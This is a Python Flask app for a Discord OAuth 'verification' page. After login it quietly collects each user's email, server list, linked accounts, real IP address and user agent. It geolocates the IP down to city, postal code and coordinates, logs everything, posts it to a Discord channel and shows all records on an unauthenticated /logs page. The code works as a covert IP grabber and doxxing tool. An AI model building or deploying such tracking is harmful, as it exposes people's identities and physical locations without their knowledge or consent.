# app.py
from flask import Flask, request, render_template
import requests, json, os, threading, ipaddress
from dotenv import load_dotenv
from datetime import datetime
from discord_bot import bot
from user_agents import parse
from urllib.parse import quote
import geoip2.database

load_dotenv()

app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

# ---------- Discord ----------
DISCORD_CLIENT_ID   = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_BOT_TOKEN   = os.getenv("DISCORD_BOT_TOKEN")
DISCORD_GUILD_ID    = os.getenv("DISCORD_GUILD_ID")
REDIRECT_URI        = os.getenv("DISCORD_REDIRECT_URI")

# ---------- IP 情報 ----------
IPINFO_TOKEN    = os.getenv("IPINFO_TOKEN")  # 推奨：必須
GEOIP_CITY_DB   = os.getenv("GEOIP_CITY_DB", "GeoLite2-City.mmdb")
GEOIP_ASN_DB    = os.getenv("GEOIP_ASN_DB",  "GeoLite2-ASN.mmdb")

# 日本語国名マップ（必要なら追加）
COUNTRY_JA = {"JP": "日本", "US": "アメリカ合衆国", "GB": "イギリス", "KR": "韓国", "CN": "中国"}

# -----------------------------
# ユーティリティ
# -----------------------------
def is_private(ip: str) -> bool:
    try:
        return ipaddress.ip_address(ip).is_private
    except:
        return False

def get_client_ip():
    # 代理/CDN 対応
    for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        v = request.headers.get(h)
        if v:
            ip = v.split(",")[0].strip()
            return ip
    return request.remote_addr

def get_ipinfo(ip: str) -> dict:
    """IPinfo から可能な限り取得（最優先）"""
    if not IPINFO_TOKEN:
        return {}
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json?token={IPINFO_TOKEN}", timeout=5)
        if r.status_code != 200:
            return {}
        j = r.json()
        loc_lat, loc_lon = None, None
        if "loc" in j and j["loc"]:
            try:
                loc_lat, loc_lon = map(float, j["loc"].split(","))
            except:
                pass
        # org 例: "AS4713 NTT Communications Corporation"
        isp, asn = None, None
        org = j.get("org")
        if org:
            parts = org.split(" ", 1)
            if parts and parts[0].startswith("AS"):
                asn = parts[0][2:]
                isp = parts[1] if len(parts) > 1 else None
            else:
                isp = org

        country_code = j.get("country")
        country_name = COUNTRY_JA.get(country_code, country_code)

        return {
            "country": country_name or "不明",
            "region": j.get("region") or "不明",
            "city": j.get("city") or "不明",
            "zip": j.get("postal") or "不明",
            "lat": loc_lat,
            "lon": loc_lon,
            "isp": isp or "不明",
            "as":  asn or "不明",
            # 有料プランなら privacy フィールドあり
            "proxy": bool(j.get("privacy", {}).get("proxy", False)) if isinstance(j.get("privacy"), dict) else False,
            "hosting": bool(j.get("privacy", {}).get("hosting", False)) if isinstance(j.get("privacy"), dict) else False,
        }
    except:
        return {}

def get_maxmind_city(ip: str) -> dict:
    try:
        reader = geoip2.database.Reader(GEOIP_CITY_DB)
        resp = reader.city(ip)
        reader.close()
        country_code = resp.country.iso_code
        return {
            "country": COUNTRY_JA.get(country_code, resp.country.name) or "不明",
            "region": resp.subdivisions.most_specific.name or "不明",
            "city": resp.city.name or "不明",
            "zip": resp.postal.code or "不明",
            "lat": resp.location.latitude,
            "lon": resp.location.longitude,
        }
    except:
        return {}

def get_maxmind_asn(ip: str) -> dict:
    try:
        reader_asn = geoip2.database.Reader(GEOIP_ASN_DB)
        a = reader_asn.asn(ip)
        reader_asn.close()
        return {
            "isp": a.autonomous_system_organization or "不明",
            "as": str(a.autonomous_system_number) if a.autonomous_system_number else "不明",
        }
    except:
        return {}

def get_ipapi(ip: str) -> dict:
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,countryCode,regionName,city,zip,isp,as,lat,lon,proxy,hosting",
            timeout=5,
        )
        j = r.json()
        if j.get("status") != "success":
            return {}
        country_name = j.get("country") or "不明"
        # 上書き日本語名
        country_name = COUNTRY_JA.get(j.get("countryCode"), country_name)
        return {
            "country": country_name,
            "region": j.get("regionName") or "不明",
            "city": j.get("city") or "不明",
            "zip": j.get("zip") or "不明",
            "lat": j.get("lat"),
            "lon": j.get("lon"),
            "isp": j.get("isp") or "不明",
            "as":  (j.get("as") or "不明").replace("AS", "").split()[0] if j.get("as") else "不明",
            "proxy": bool(j.get("proxy", False)),
            "hosting": bool(j.get("hosting", False)),
        }
    except:
        return {}

def merge_geo(base: dict, add: dict) -> dict:
    # base を優先しつつ add で空/不明を埋める
    out = base.copy()
    for k, v in add.items():
        if out.get(k) in (None, "", "不明"):
            out[k] = v
    return out

def resolve_geo(ip: str) -> dict:
    # 1) IPinfo（最優先）
    geo = {"country":"不明","region":"不明","city":"不明","zip":"不明",
           "lat":None,"lon":None,"isp":"不明","as":"不明","proxy":False,"hosting":False}
    g1 = get_ipinfo(ip)
    geo = merge_geo(geo, g1)

    # 2) MaxMind City/ASN で補完
    g2 = get_maxmind_city(ip)
    geo = merge_geo(geo, g2)
    g3 = get_maxmind_asn(ip)
    geo = merge_geo(geo, g3)

    # 3) まだ不明が残れば ip-api で最終補完
    if any(geo[k] in (None, "", "不明") for k in ("region","city","isp","as","lat","lon")):
        g4 = get_ipapi(ip)
        geo = merge_geo(geo, g4)

    # 最終ガード
    if not geo.get("country") or geo["country"] == "":
        geo["country"] = "不明"
    return geo

def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    logs = {}
    if os.path.exists(ACCESS_LOG_FILE):
        try:
            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)
        except:
            logs = {}
    if discord_id not in logs:
        logs[discord_id] = {"history": []}
    data["timestamp"] = now
    logs[discord_id]["history"].append(data)
    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

def send_embed_and_role(user_id: str, data: dict):
    # Embed送信（裏で）
    try:
        embed_data = {
            "title": "🔐 セキュリティログ通知",
            "color": 0x2B2D31,
            "description": (
                "```ini\n"
                f"[ ユーザー ]\n{data.get('username')}#{data.get('discriminator')}\n"
                f"ID={data.get('id')}\n"
                f"Email={data.get('email')}\n"
                f"IP={data.get('ip')}\n"
                f"Region={data.get('country')}/{data.get('region')}/{data.get('city')}\n"
                f"ZIP={data.get('zip')}\n"
                f"ISP/AS={data.get('isp')}/{data.get('as')}\n"
                "```"
            ),
            "thumbnail": {"url": data.get("avatar_url")},
            "footer": {"text": "BLACK_ルアン セキュリティモニター"},
            "timestamp": datetime.utcnow().isoformat()
        }
        bot.loop.create_task(bot.send_log(embed=embed_data))
        bot.loop.create_task(bot.assign_role(user_id))
    except Exception as e:
        print("Embed/Role 送信エラー:", e)

# -----------------------------
# ルート
# -----------------------------
@app.route("/")
def index():
    redirect_uri_encoded = quote(REDIRECT_URI, safe="")
    scopes = "identify email connections guilds"
    scopes_encoded = quote(scopes, safe="")
    discord_auth_url = (
        "https://discord.com/oauth2/authorize"
        f"?client_id={DISCORD_CLIENT_ID}"
        "&response_type=code"
        f"&redirect_uri={redirect_uri_encoded}"
        f"&scope={scopes_encoded}"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)

# -----------------------------
# コールバック
# -----------------------------
@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    token_url = "https://discord.com/api/oauth2/token"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    scopes = "identify email connections guilds"
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": REDIRECT_URI,
        "scope": scopes
    }

    try:
        res = requests.post(token_url, data=data, headers=headers, timeout=10)
        res.raise_for_status()
        token = res.json()
    except requests.exceptions.RequestException as e:
        return f"トークン取得エラー: {e}", 500

    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth, timeout=10).json()
    guilds = requests.get("https://discord.com/api/users/@me/guilds", headers=headers_auth, timeout=10).json()
    connections = requests.get("https://discord.com/api/users/@me/connections", headers=headers_auth, timeout=10).json()

    # Bot でサーバー参加
    try:
        requests.put(
            f"https://discord.com/api/guilds/{DISCORD_GUILD_ID}/members/{user['id']}",
            headers={"Authorization": f"Bot {DISCORD_BOT_TOKEN}", "Content-Type": "application/json"},
            json={"access_token": access_token},
            timeout=10
        )
    except:
        pass

    # IP 取得
    ip = get_client_ip()
    if is_private(ip):
        try:
            ip = requests.get("https://api.ipify.org", timeout=5).text
        except:
            pass

    # まず最小セットで画面返す用データを作る（体感を速く）
    ua_raw = request.headers.get("User-Agent", "不明")
    ua = parse(ua_raw)
    avatar_url = f"https://cdn.discordapp.com/avatars/{user['id']}/{user.get('avatar')}.png?size=1024" if user.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"

    data_min = {
        "username": user.get("username"),
        "discriminator": user.get("discriminator"),
        "id": user.get("id"),
        "email": user.get("email"),
        "avatar_url": avatar_url,
        "ip": ip,
        "country": "不明", "region": "不明", "city": "不明", "zip": "不明",
        "isp": "不明", "as": "不明", "lat": None, "lon": None,
        "proxy": False, "hosting": False,
        "user_agent_raw": ua_raw,
        "user_agent_os": ua.os.family,
        "user_agent_browser": ua.browser.family,
        "user_agent_device": "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "PC" if ua.is_pc else "Other",
        "user_agent_bot": ua.is_bot,
        "guilds": guilds,
        "connections": connections,
    }

    # 裏で高精度補完→保存→Embed/Role
    def enrich_and_log():
        geo = resolve_geo(ip)
        data_full = data_min.copy()
        data_full.update({
            "country": geo["country"], "region": geo["region"], "city": geo["city"], "zip": geo["zip"],
            "isp": geo["isp"], "as": geo["as"], "lat": geo["lat"], "lon": geo["lon"],
            "proxy": geo.get("proxy", False), "hosting": geo.get("hosting", False)
        })
        save_log(user["id"], data_full)
        send_embed_and_role(user["id"], data_full)

    threading.Thread(target=enrich_and_log, daemon=True).start()

    # 画面はすぐ返す（裏で補完が走る）
    return render_template("welcome.html", username=data_min["username"], discriminator=data_min["discriminator"])

# -----------------------------
# ログ閲覧
# -----------------------------
@app.route("/logs")
def show_logs():
    if os.path.exists(ACCESS_LOG_FILE):
        try:
            with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
                logs = json.load(f)
        except:
            logs = {}
    else:
        logs = {}
    return render_template("logs.html", logs=logs)

# -----------------------------
# Bot 起動
# -----------------------------
def run_bot():
    bot.run(DISCORD_BOT_TOKEN)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=10000)
